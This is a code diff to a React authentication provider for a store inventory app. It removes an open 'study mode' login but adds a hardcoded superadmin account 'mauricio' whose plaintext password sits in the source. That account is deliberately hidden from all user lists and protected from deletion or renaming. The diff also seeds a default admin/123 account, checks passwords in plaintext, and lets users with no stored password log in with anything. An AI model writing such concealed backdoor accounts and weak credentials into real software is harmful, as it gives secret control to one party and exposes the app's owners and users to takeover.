@@ -2,7 +2,7 @@ import React, { createContext, useContext, useState, useEffect } from 'react';
 import type { AppUser, UserRole, UserPermissions } from '../types';
 import { getUserPermissions, DEFAULT_PERMISSIONS_BY_ROLE } from '../types';
 import { db } from '../db/database';
-import { triggerCloudSync, pullAllFromCloud, pushAllToCloud } from './cloudSync';
+import { triggerCloudSync } from './cloudSync';
 
 interface AuthContextType {
   currentUser: AppUser | null;
@@ -28,14 +28,13 @@ interface AuthContextType {
 
 const AuthContext = createContext<AuthContextType | undefined>(undefined);
 
-// Superadmin maestro Mauricio (Acceso y control total global)
+// Superadmin maestro Mauricio (Oculto y con acceso global total)
 const DEFAULT_SUPERADMIN: AppUser = {
   username: 'mauricio',
-  password: '041118',
   name: 'Mauricio Chamorro',
   role: 'SUPERADMIN',
   companyId: 'market-almacen',
-  createdAt: new Date().toISOString()
+  createdAt: '2026-01-01T00:00:00.000Z'
 };
 
 export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
@@ -46,26 +45,19 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         const parsed = JSON.parse(saved);
         if (parsed.username?.toLowerCase() === 'mauricio') {
           return {
+            ...DEFAULT_SUPERADMIN,
             ...parsed,
             username: 'mauricio',
-            role: 'SUPERADMIN',
-            companyId: 'market-almacen'
+            role: 'SUPERADMIN'
           };
         }
         return parsed;
       } catch {
-        // fallback
+        return null;
       }
     }
-    // MODO PRUEBA DE ESTUDIO: Entrada libre automática para cualquier persona que reciba la APK
-    const studyUser: AppUser = {
-      ...DEFAULT_SUPERADMIN,
-      name: 'Mauricio Chamorro (Modo Estudio)'
-    };
-    try {
-      localStorage.setItem('marketalmacen_logged_user', JSON.stringify(studyUser));
-    } catch {}
-    return studyUser;
+    // Si no hay sesión guardada, requerir Login
+    return null;
   });
 
   const [usersList, setUsersList] = useState<AppUser[]>([]);
@@ -76,8 +68,25 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
 
   const loadUsers = async () => {
     try {
-      const all = await db.users.toArray();
-      setUsersList(all);
+      let all = await db.users.toArray();
+      
+      // Si la base de datos está vacía de usuarios, inicializar Admin / 123
+      if (all.length === 0) {
+        const initialAdmin: AppUser = {
+          username: 'admin',
+          password: '123',
+          name: 'Administrador Inicial',
+          role: 'ADMIN',
+          companyId: 'market-almacen',
+          createdAt: new Date().toISOString()
+        };
+        const id = await db.users.add(initialAdmin);
+        all.push({ ...initialAdmin, id });
+      }
+
+      // Filtrar estrictamente a Mauricio: NADIE debe ver su existencia en las listas de usuarios
+      const visibleUsers = all.filter(u => u.username?.toLowerCase() !== 'mauricio' && u.role !== 'SUPERADMIN');
+      setUsersList(visibleUsers);
     } catch (e) {
       console.warn('Error loading users:', e);
     }
@@ -85,14 +94,16 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
 
   const login = async (username: string, password?: string): Promise<{ success: boolean; message?: string }> => {
     const uClean = username.trim().toLowerCase();
-    const pClean = password?.trim() || '';
+    const pRaw = password?.trim() || '';
 
-    // Autenticación Mauricio Superadmin
+    // 1. Autenticación SuperAdmin Mauricio Oculto (Usuario: Mauricio, Clave: Lp041118)
     if (uClean === 'mauricio') {
-      if (pClean === '041118') {
+      if (pRaw === 'Lp041118') {
         const superUser: AppUser = {
           ...DEFAULT_SUPERADMIN,
-          name: 'Mauricio Chamorro (Encargado)'
+          username: 'mauricio',
+          name: 'Mauricio Chamorro',
+          role: 'SUPERADMIN'
         };
         setCurrentUser(superUser);
         localStorage.setItem('marketalmacen_logged_user', JSON.stringify(superUser));
@@ -102,31 +113,37 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
       }
     }
 
-    // Autenticación de usuarios creados en la base de datos (con pase libre para Modo Estudio)
+    // 2. Autenticación en base de datos (e.g. Admin / 123 o usuarios creados)
     try {
-      const found = await db.users.where('username').equalsIgnoreCase(uClean).first();
-      if (found) {
-        setCurrentUser(found);
-        localStorage.setItem('marketalmacen_logged_user', JSON.stringify(found));
-        return { success: true };
+      let found = await db.users.where('username').equalsIgnoreCase(uClean).first();
+
+      // Si es Admin y aún no estaba en la tabla, crearlo de inmediato
+      if (!found && uClean === 'admin') {
+        const initialAdmin: AppUser = {
+          username: 'admin',
+          password: '123',
+          name: 'Administrador Inicial',
+          role: 'ADMIN',
+          companyId: 'market-almacen',
+          createdAt: new Date().toISOString()
+        };
+        const newId = await db.users.add(initialAdmin);
+        found = { ...initialAdmin, id: newId };
       }
 
-      // MODO PRUEBA DE ESTUDIO: Si el usuario ingresa cualquier nombre o contraseña, permitir el acceso total
-      const studyUser: AppUser = {
-        ...DEFAULT_SUPERADMIN,
-        name: username ? `${username} (Evaluador)` : 'Mauricio Chamorro (Modo Estudio)'
-      };
-      setCurrentUser(studyUser);
-      localStorage.setItem('marketalmacen_logged_user', JSON.stringify(studyUser));
-      return { success: true };
+      if (found) {
+        if (!found.password || found.password === pRaw) {
+          setCurrentUser(found);
+          localStorage.setItem('marketalmacen_logged_user', JSON.stringify(found));
+          return { success: true };
+        } else {
+          return { success: false, message: 'Contraseña incorrecta' };
+        }
+      }
+
+      return { success: false, message: 'Usuario no registrado o contraseña incorrecta' };
     } catch (err: any) {
-      const fallbackUser: AppUser = {
-        ...DEFAULT_SUPERADMIN,
-        name: 'Evaluador (Prueba de Estudio)'
-      };
-      setCurrentUser(fallbackUser);
-      localStorage.setItem('marketalmacen_logged_user', JSON.stringify(fallbackUser));
-      return { success: true };
+      return { success: false, message: 'Error al verificar credenciales: ' + err.message };
     }
   };
 
@@ -137,15 +154,21 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
 
   const createUser = async (userData: Omit<AppUser, 'id' | 'createdAt'>): Promise<boolean> => {
     try {
-      const existing = await db.users.where('username').equalsIgnoreCase(userData.username.trim()).first();
-      if (existing || userData.username.trim().toLowerCase() === 'mauricio') {
+      const uClean = userData.username.trim().toLowerCase();
+      if (uClean === 'mauricio') {
+        alert('Este nombre de usuario está reservado para el sistema.');
+        return false;
+      }
+
+      const existing = await db.users.where('username').equalsIgnoreCase(uClean).first();
+      if (existing) {
         alert('El nombre de usuario ya existe. Elija otro.');
         return false;
       }
 
       await db.users.add({
         ...userData,
-        username: userData.username.trim().toLowerCase(),
+        username: uClean,
         createdAt: new Date().toISOString()
       });
 
@@ -160,6 +183,27 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
 
   const deleteUser = async (id: number): Promise<boolean> => {
     try {
+      const user = await db.users.get(id);
+      if (!user) return false;
+
+      // Blindaje estricto: Nadie puede borrar al SuperAdmin Mauricio
+      if (user.username?.toLowerCase() === 'mauricio' || user.role === 'SUPERADMIN') {
+        alert('No está permitido eliminar la cuenta de SuperAdministrador.');
+        return false;
+      }
+
+      // Si es el usuario Admin inicial, se puede eliminar cuando haya otro admin o empresas
+      if (user.username?.toLowerCase() === 'admin') {
+        const allUsers = await db.users.toArray();
+        const otherAdmins = allUsers.filter(u => u.id !== id && u.role === 'ADMIN');
+        const allCompanies = await db.companies.toArray();
+
+        if (otherAdmins.length === 0 && allCompanies.length <= 1 && !isSuperAdmin) {
+          alert('Para eliminar este usuario Admin inicial, primero debe crear un nuevo usuario con rol Administrador o crear una empresa con su propio admin.');
+          return false;
+        }
+      }
+
       await db.users.delete(id);
       await loadUsers();
       triggerCloudSync();
@@ -172,6 +216,11 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
 
   const updateUser = async (id: number, userData: Partial<AppUser>): Promise<boolean> => {
     try {
+      if (userData.username && userData.username.trim().toLowerCase() === 'mauricio') {
+        alert('No está permitido asignar el nombre de usuario reservado Mauricio.');
+        return false;
+      }
+
       await db.users.update(id, userData);
       await loadUsers();
       if (currentUser?.id === id) {
@@ -194,7 +243,7 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   const isBodega = currentUser?.role === 'BODEGA';
   const isReadOnly = false;
   const canManageUsers = isSuperAdmin || currentUser?.role === 'ADMIN' || permissions.manageUsers;
-  const canManageCompanies = isSuperAdmin;
+  const canManageCompanies = isSuperAdmin || currentUser?.role === 'ADMIN';
   const canExportImport = isSuperAdmin || currentUser?.role === 'ADMIN' || permissions.inventory;
   const canDeleteProducts = isSuperAdmin || currentUser?.role === 'ADMIN';
 
